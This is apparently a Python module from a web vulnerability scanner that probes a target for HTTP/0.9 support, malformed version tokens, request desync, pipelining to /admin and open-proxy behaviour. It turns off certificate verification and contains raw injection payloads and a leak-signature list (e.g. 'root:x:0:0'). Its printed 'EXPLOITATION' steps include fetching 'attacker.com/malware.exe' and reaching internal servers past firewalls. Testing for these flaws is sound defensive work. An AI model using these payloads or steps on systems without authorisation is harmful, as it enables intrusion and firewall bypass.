#!/usr/bin/env python3

from __future__ import annotations

import gzip
import hashlib
import socket
import ssl
import zlib
from typing import Any

from utils.style import Colors
from utils.utils import configure_logger, re, requests, time, urlparse

logger = configure_logger(__name__)


PROXY_PROBE_URL = "http://httpbin.org/get"
PROXY_PROBE_MARKERS = [
    "httpbin",
    '"origin":',
    "Kenneth Reitz",
    '"Host": "httpbin.org"',
    '"url": "http://httpbin.org',
    "JSON",
]


def parse_target(url: str) -> tuple[str, str | None, int, str]:
    u = urlparse(url)
    scheme = u.scheme or "http"
    host = u.hostname
    path = u.path or "/"
    if u.query:
        path = f"{path}?{u.query}"
    port = u.port or (443 if scheme == "https" else 80)
    return scheme, host, port, path


def detect_http_version_support(url: str) -> list[str]:
    try:
        scheme, host, port, path = parse_target(url)
        if scheme != "https":
            return []

        raw = socket.create_connection((host, port), timeout=10)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])

        ssock = ctx.wrap_socket(raw, server_hostname=host)
        selected_protocol = ssock.selected_alpn_protocol()
        ssock.close()

        if selected_protocol:
            return [selected_protocol]
        return []
    except Exception:
        return []


def make_tls_socket(
    host: str | None, port: int, *, force_h1: bool = False, timeout: int = 10
) -> ssl.SSLSocket:
    raw = socket.create_connection((host, port), timeout=timeout)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if force_h1:
        try:
            ctx.set_alpn_protocols(["http/1.1"])
        except Exception:
            pass
    ssock = ctx.wrap_socket(raw, server_hostname=host)
    return ssock


def send_recv(
    sock: socket.socket | ssl.SSLSocket,
    data: bytes | None,
    read_timeout: int = 10,
    expect_more: bool = False,
) -> bytes:
    sock.settimeout(read_timeout)
    if data:
        sock.sendall(data)
    time.sleep(0.1)

    buff = b""
    headers_complete = False
    content_length = None

    try:
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                buff += chunk

                if not headers_complete and b"\r\n\r\n" in buff:
                    headers_complete = True
                    header_part = buff.split(b"\r\n\r\n")[0]
                    for line in header_part.split(b"\r\n"):
                        if line.lower().startswith(b"content-length:"):
                            try:
                                content_length = int(line.split(b":")[1].strip())
                            except Exception:
                                pass
                            break

                if headers_complete and content_length is not None:
                    body_start = buff.find(b"\r\n\r\n") + 4
                    if len(buff) - body_start >= content_length:
                        break

            except TimeoutError:
                break
            except Exception:
                break

    except Exception:
        pass

    return buff


def analyze_response_headers(response_data: bytes) -> dict[str, str | None]:
    try:
        header_end = response_data.find(b"\r\n\r\n")
        if header_end == -1:
            return {}

        headers_part = response_data[:header_end].decode("utf-8", errors="ignore")
        headers = {}

        for line in headers_part.split("\r\n")[1:]:  # Skip status line
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip().lower()] = value.strip()

        info = {
            "server": headers.get("server", "Unknown"),
            "content_type": headers.get("content-type", "Unknown"),
            "content_encoding": headers.get("content-encoding"),
            "transfer_encoding": headers.get("transfer-encoding"),
            "connection": headers.get("connection", "Unknown"),
            "upgrade": headers.get("upgrade"),
        }

        return info
    except Exception:
        return {}


def decompress_if_needed(response_data: bytes, url: str | None = None) -> bytes:
    if url:
        print(" ├── ALPN Protocol Detection:")
        alpn_versions = detect_http_version_support(url)
        for ver in alpn_versions:
            print(f" │   └─ {ver}")
        if not alpn_versions:
            print(" │   └─ No ALPN protocols detected")

    try:
        header_end = response_data.find(b"\r\n\r\n")
        if header_end == -1:
            return response_data

        headers_part = response_data[:header_end].lower()
        body_part = response_data[header_end + 4 :]

        if b"content-encoding: gzip" in headers_part:
            try:
                decompressed_body = gzip.decompress(body_part)
                return response_data[: header_end + 4] + decompressed_body
            except Exception:
                pass
        elif b"content-encoding: deflate" in headers_part:
            try:
                decompressed_body = zlib.decompress(body_part)
                return response_data[: header_end + 4] + decompressed_body
            except Exception:
                pass

    except Exception:
        pass

    return response_data


def first_line_and_code(resp: bytes) -> tuple[str, int | None]:
    try:
        line = resp.split(b"\r\n", 1)[0][:200]
        m = re.search(rb"HTTP/\d\.\d\s+(\d+)", line)
        return line.decode(errors="replace"), int(m.group(1)) if m else None
    except Exception:
        return (resp[:80].decode(errors="replace"), None)


def sanitize_first_line(fl: Any) -> str:
    if not isinstance(fl, str):
        try:
            fl = str(fl)
        except Exception:
            return "Error"
    s = fl.lstrip().upper()
    if (
        s.startswith("<!DOCTYPE")
        or s.startswith("<HTML")
        or s.startswith("<!DOCTYPE HTML")
    ):
        return "Error"
    if "�" in fl:
        return "Binary/Unknown"
    if s.startswith("<"):
        return "Error"
    return str(fl)


VALID_TOKENS = {"HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"}


def classify_version_token(v: str) -> list[str]:
    flags = []
    if v == "":
        flags.append("empty_version")
        return flags
    if v != v.strip():
        if v.startswith(" "):
            flags.append("leading_space")
        if v.endswith(" "):
            flags.append("trailing_space")
    if any(ch in v for ch in ["\t", "\r", "\n"]):
        flags.append("malformed")
    if v.upper().startswith("HTTP/") and v != v.upper():
        flags.append("mixed_case")
    if v not in VALID_TOKENS:
        flags.append("invalid_token")
    return flags


def is_likely_http09_response(response: bytes) -> bool:
    if not response or len(response) == 0:
        return False

    if b"HTTP/" in response[:200]:
        return False

    if b"Content-Type:" in response[:500] or b"Server:" in response[:500]:
        return False

    response_start = response[:500].lower()
    html_indicators = [b"<!doctype", b"<html", b"<head", b"<body", b"<title"]

    if any(response_start.startswith(indicator) for indicator in html_indicators):
        return True

    if not response_start.startswith(b"<") and len(response) > 10:
        return True

    return False


def probe_http_09(url: str) -> tuple[bool, bytes]:
    scheme, host, port, path = parse_target(url)

    tests = [
        f"GET {path}\r\n\r\n",
        f"GET {path}\n\n",
        f"GET {path}",
    ]

    results = []

    for i, request_template in enumerate(tests):
        try:
            s: socket.socket | ssl.SSLSocket
            if scheme == "https":
                s = make_tls_socket(host, port, force_h1=True, timeout=10)
            else:
                s = socket.create_connection((host, port), timeout=10)

            req = request_template.encode()
            resp = send_recv(s, req, expect_more=True, read_timeout=12)
            time.sleep(0.05)
            try:
                resp += s.recv(65535)
            except Exception:
                pass
            s.close()

            is_09 = is_likely_http09_response(resp)
            results.append((is_09, resp, request_template))

        except Exception:
            results.append((False, b"", request_template))

    positive_results = [r for r in results if r[0]]

    if len(positive_results) >= 2:
        response_hashes = [
            hashlib.md5(
                r[1]
            ).hexdigest()  # nosec B324 - MD5 used for response comparison, not security
            for r in positive_results
        ]
        if len(set(response_hashes)) <= 2:
            return True, positive_results[0][1]

    return False, b""


def validate_vulnerability_response(
    response: bytes, test_name: str
) -> tuple[bool, str]:
    if not response or len(response) < 10:
        return False, "Empty or too short response"

    false_positive_signatures = [
        b"400 Bad Request",
        b"404 Not Found",
        b"405 Method Not Allowed",
        b"500 Internal Server Error",
        b"Connection closed",
        b"Bad Request",
        b"Invalid request",
    ]

    response_lower = response.lower()
    for fp_sig in false_positive_signatures:
        if fp_sig.lower() in response_lower:
            return False, f"False positive detected: {fp_sig.decode()}"

    if test_name == "desync_injection":
        if b"200 OK" in response and len(response) > 100:
            return True, "Potential desync injection successful"
        return False, "No evidence of successful desync"

    elif test_name == "pipeline_possible":
        if response.count(b"HTTP/") > 1:
            return True, "Multiple HTTP responses detected"
        if b"/admin" in response_lower or b"unauthorized" in response_lower:
            return True, "Admin path accessed or security response"
        return False, "No evidence of pipeline vulnerability"

    elif test_name == "proxy_path_confusion":
        return False, "Marker-based validation required"

    return len(response) > 50, "Response analysis inconclusive"


def test_http09_misconf(url: str) -> dict[str, Any]:
    scheme, host, port, path = parse_target(url)
    results: dict[str, Any] = {}

    leak_signatures = [
        b"root:x:0:0",
        b"[boot loader]",
        b"[operating systems]",
        b"<!DOCTYPE html",
        b"index of /",
        b"<title>phpinfo",
        b"mysql_connect",
        b"password",
        b"secret",
        b"config",
    ]

    try:
        payload = f"GET {path}\n\rHTTP/1.1 200 OK\n\r\n\r".encode()
        s: socket.socket | ssl.SSLSocket
        if scheme == "https":
            s = make_tls_socket(host, port, force_h1=True, timeout=10)
        else:
            s = socket.create_connection((host, port), timeout=10)
        resp_desync = send_recv(s, payload, read_timeout=8)
        s.close()

        is_vuln, reason = validate_vulnerability_response(
            resp_desync, "desync_injection"
        )
        results["desync_injection"] = is_vuln
        results["desync_injection_reason"] = reason

        if is_vuln:
            results["desync_injection_payload"] = payload.decode(errors="replace")
            results["desync_injection_response"] = resp_desync[:300]
    except Exception as e:
        results["desync_injection"] = False
        results["desync_injection_reason"] = f"Error: {str(e)}"

    try:
        payload = f"GET {path}\n\rGET /admin\n\r".encode()
        s2: socket.socket | ssl.SSLSocket
        if scheme == "https":
            s2 = make_tls_socket(host, port, force_h1=True, timeout=10)
        else:
            s2 = socket.create_connection((host, port), timeout=10)
        resp_pipeline = send_recv(s2, payload, read_timeout=8)
        s2.close()

        is_vuln, reason = validate_vulnerability_response(
            resp_pipeline, "pipeline_possible"
        )
        results["pipeline_possible"] = is_vuln
        results["pipeline_possible_reason"] = reason

        if is_vuln:
            results["pipeline_possible_payload"] = payload.decode(errors="replace")
            results["pipeline_possible_response"] = resp_pipeline[:300]
    except Exception as e:
        results["pipeline_possible"] = False
        results["pipeline_possible_reason"] = f"Error: {str(e)}"

    try:
        _tgt = urlparse(url)
        _probe = urlparse(PROXY_PROBE_URL)

        if (_probe.hostname or "").lower() == (_tgt.hostname or "").lower():
            results["proxy_path_confusion"] = False
            results["proxy_path_confusion_exploit"] = (
                "Test skipped - probe URL matches target host"
            )
        else:
            payload1 = f"GET {PROXY_PROBE_URL}\r\n\r\n".encode()
            s3: socket.socket | ssl.SSLSocket
            if scheme == "https":
                s3 = make_tls_socket(host, port, force_h1=True, timeout=10)
            else:
                s3 = socket.create_connection((host, port), timeout=10)
            resp_proxy = send_recv(s3, payload1, read_timeout=8)
            s3.close()

            low = resp_proxy[:4096].lower()
            markers = [
                m.lower().encode() if isinstance(m, str) else m.lower()
                for m in PROXY_PROBE_MARKERS
            ]
            is_vuln1 = any(m in low for m in markers)

            sensitive_url = "http://httpbin.org/status/418"
            payload2 = f"GET {sensitive_url}\r\n\r\n".encode()
            try:
                s4: socket.socket | ssl.SSLSocket
                if scheme == "https":
                    s4 = make_tls_socket(host, port, force_h1=True, timeout=10)
                else:
                    s4 = socket.create_connection((host, port), timeout=10)
                resp_sensitive = send_recv(s4, payload2, read_timeout=8)
                s4.close()
                is_vuln2 = (
                    b"418" in resp_sensitive and b"teapot" in resp_sensitive.lower()
                )
            except Exception:
                is_vuln2 = False

            is_vuln = is_vuln1 or is_vuln2
            results["proxy_path_confusion"] = bool(is_vuln)

            if is_vuln:
                exploit_info = []
                exploit_info.append("EXPLOITATION:")
                exploit_info.append("1. Send: GET http://internal-server/admin")
                exploit_info.append("2. Send: GET http://attacker.com/malware.exe")
                exploit_info.append("3. Send: GET ftp://sensitive-server/config")
                exploit_info.append("4. Server acts as open proxy, forwarding requests")
                exploit_info.append(
                    "5. Can bypass firewalls and access internal resources"
                )

                results["proxy_path_confusion_exploit"] = "\n         ".join(
                    exploit_info
                )
                results["proxy_path_confusion_payload"] = (
                    f"Successful payload: {payload1.decode(errors='replace')}"
                )
                results["proxy_path_confusion_response"] = resp_proxy[:300]
            else:
                pass
                # results["proxy_path_confusion_exploit"] = "No proxy behavior detected - server correctly rejects absolute URLs"

    except Exception as e:
        results["proxy_path_confusion"] = False
        results["proxy_path_confusion_exploit"] = f"Test failed: {str(e)}"

    test_responses = [
        ("desync_injection", results.get("desync_injection_response", b"")),
        ("pipeline_possible", results.get("pipeline_possible_response", b"")),
        ("proxy_path_confusion", results.get("proxy_path_confusion_response", b"")),
    ]

    for name, content in test_responses:
        if content:
            for sig in leak_signatures:
                if sig in content.lower():
                    results[f"{name}_content_leak"] = True
                    results[f"{name}_leaked_signature"] = sig.decode(errors="replace")
                    break

    return results


def probe_weird_versions(url: str, versions: list[str]) -> list[dict[str, Any]]:
    scheme, host, port, path = parse_target(url)
    results = []

    for v in versions:
        flags = classify_version_token(v)
        req = None
        try:
            s: socket.socket | ssl.SSLSocket
            if scheme == "https":
                s = make_tls_socket(host, port, force_h1=True, timeout=10)
            else:
                s = socket.create_connection((host, port), timeout=10)

            if v == "":
                req = f"GET {path}\r\nHost: {host}\r\nUser-Agent: python-requests/2.28.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\n\r\n".encode()
            else:
                req = f"GET {path} {v}\r\nHost: {host}\r\nUser-Agent: python-requests/2.28.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\n\r\n".encode()

            resp = send_recv(s, req, read_timeout=15)
            s.close()

            resp = decompress_if_needed(resp)

            header_info = analyze_response_headers(resp)

            fl, code = first_line_and_code(resp)
            size = len(resp)
            accepted = (code is not None and code < 400) or (code in (101,))

            results.append(
                {
                    "version": v,
                    "code": code,
                    "size": size,
                    "first_line": fl,
                    "flags": flags,
                    "accepted": bool(accepted),
                    "raw_request": req.decode(errors="replace"),
                    "server": header_info.get("server", ""),
                    "content_type": header_info.get("content_type", ""),
                    "headers_info": header_info,
                }
            )
        except Exception as e:
            results.append(
                {
                    "version": v,
                    "code": None,
                    "size": 0,
                    "first_line": f"ERR: {e.__class__.__name__}",
                    "flags": flags,
                    "accepted": False,
                    "raw_request": req.decode(errors="replace") if req else "",
                }
            )
    return results


def risk_badge(item: dict[str, Any]) -> str:
    flags = set(item.get("flags", []))
    if item.get("accepted") and flags.intersection(
        {
            "empty_version",
            "leading_space",
            "trailing_space",
            "invalid_token",
            "mixed_case",
        }
    ):
        return f"{Colors.YELLOW}⚠️{Colors.RESET}"
    return ""


def print_line(
    v: str, code: int | None, size: int, extra: str = "", server: str = ""
) -> None:
    code_str = f"{code}" if code is not None else "—"
    server_info = f" ({server[:20]})" if server and server != "Unknown" else ""
    spaces3 = " " * 3
    spaces5 = " " * 5
    print(f" ├── {v:<15}: {code_str:<3}{spaces3}[{size}b]{server_info}{spaces5}{extra}")


def check_http_version(url: str) -> None:
    print(f"{Colors.CYAN} ├ Version & protocol analysis{Colors.RESET}")

    versions = [
        "HTTP/2",
        "HTTP/0.9",
        "HTTP/1.0",
        "HTTP/1.1",
        "HTTP/1.6",
        "HTTP/2",
        "HTTP/3",
        "QUIC",
        "HtTP/1.1",
        "SHTTP/1.3",
        "HTTP/1.1.1",
        "HTTP/1.2",
        "HTTP/4.0",
        "HTTP/99.9",
        "INVALID/1.1",
        "",
        " HTTP/1.1",
        "HTTP/1.1 ",
        "HTTP/3",
    ]

    try:
        # Test basic HTTP connectivity
        requests.get(url, verify=False, allow_redirects=False, timeout=10)
    except Exception as e:
        print(f" ├── Base error: {e}")

    try:
        is09, sample = probe_http_09(url)
        stat = (
            f"{Colors.GREEN}Support{Colors.RESET}"
            if is09
            else f"{Colors.RED}X{Colors.RESET}"
        )
        print(f" ├── HTTP/0.9: {stat} [{len(sample)} bytes]")

        if is09:
            misconf = test_http09_misconf(url)
            main_tests = [
                "desync_injection",
                "pipeline_possible",
                "proxy_path_confusion",
            ]
            for test_name in main_tests:
                is_vulnerable = misconf.get(test_name, False)

                if is_vulnerable:
                    status = f"{Colors.RED}VULNERABLE{Colors.RESET}"
                    print(f"       - {test_name}: {status}")

                    exploit_key = f"{test_name}_exploit"
                    if exploit_key in misconf:
                        print(f"         └─ {misconf[exploit_key]}")

                    payload_key = f"{test_name}_payload"
                    if payload_key in misconf:
                        print(f"         └─ Test payload: {misconf[payload_key]}")

                    response_key = f"{test_name}_response"
                    if response_key in misconf:
                        response_preview = misconf[response_key].decode(
                            errors="replace"
                        )[:100]
                        print(
                            f"         └─ Response preview: {repr(response_preview)}..."
                        )
                else:
                    status = f"{Colors.GREEN}SAFE{Colors.RESET}"
                    print(f"       - {test_name}: {status}")

                    exploit_key = f"{test_name}_exploit"
                    if exploit_key in misconf:
                        print(f"         └─ {misconf[exploit_key]}")

            content_leak_tests = [
                k for k in misconf.keys() if k.endswith("_content_leak")
            ]
            if content_leak_tests:
                print("       Content leak analysis:")
                for leak_test in content_leak_tests:
                    if misconf.get(leak_test, False):
                        sig_key = leak_test.replace(
                            "_content_leak", "_leaked_signature"
                        )
                        signature = misconf.get(sig_key, "Unknown signature")
                        print(
                            f"         - {leak_test}: {Colors.RED}DETECTED{Colors.RESET} ({signature})"
                        )

    except Exception as e:
        print(f" ├── HTTP/0.9: error during enhanced testing: {e}")
        logger.exception("HTTP/0.9 testing error")

    weirds = probe_weird_versions(url, [v for v in versions if v != "HTTP/0.9"])

    accepted_versions = [item for item in weirds if item["accepted"]]
    rejected_versions = [item for item in weirds if not item["accepted"]]

    if accepted_versions:
        print(f"\n ├── Accepted versions ({len(accepted_versions)}):")
        for item in accepted_versions:
            v = item["version"] if item["version"] != "" else "<empty>"
            flags = ",".join(item["flags"]) if item["flags"] else "N/A"
            badge = risk_badge(item)
            fl_sane = sanitize_first_line(item["first_line"])
            extra = f"{badge} [{fl_sane}] flags={flags}"
            print_line(v, item["code"], item["size"], extra, item.get("server", ""))

    if rejected_versions:
        print(f"\n ├── Rejected/Error versions ({len(rejected_versions)}):")
        for item in rejected_versions[:9]:
            v = item["version"] if item["version"] != "" else "<empty>"
            flags = ",".join(item["flags"]) if item["flags"] else "N/A"
            badge = risk_badge(item)
            fl_sane = sanitize_first_line(item["first_line"])
            extra = f"{badge} [{fl_sane}] flags={flags}"
            print_line(v, item["code"], item["size"], extra, item.get("server", ""))
